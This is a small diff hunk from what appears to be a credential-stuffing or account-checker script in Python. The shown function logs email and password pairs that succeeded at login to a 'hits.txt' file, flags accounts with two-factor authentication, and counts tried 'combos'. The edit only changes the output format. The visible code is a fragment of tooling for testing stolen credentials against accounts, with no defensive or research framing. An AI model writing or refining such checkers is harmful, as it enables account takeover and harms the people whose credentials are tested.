@@ -78,7 +78,7 @@ def PostRequest(fllreponse, run, GOLD1, GOLD2):
     elif fllresponse == 2:
         print("Account Creds correct however 2FA appears to be enabled")
         accounts = open("hits.txt", "a")
-        accounts.write("HIT ON LINE(!!!Potential 2FA!!!) {} EMAIL: {} PASSWORD: {}\n".format(x, GOLD1, GOLD2))
+        accounts.write("HIT ON LINE(!!!Potential 2FA!!!) EMAIL: {} PASSWORD: {}\n".format(GOLD1, GOLD2))
         accounts.close()
     else:
         print("Running tried {} combos so far".format(run))
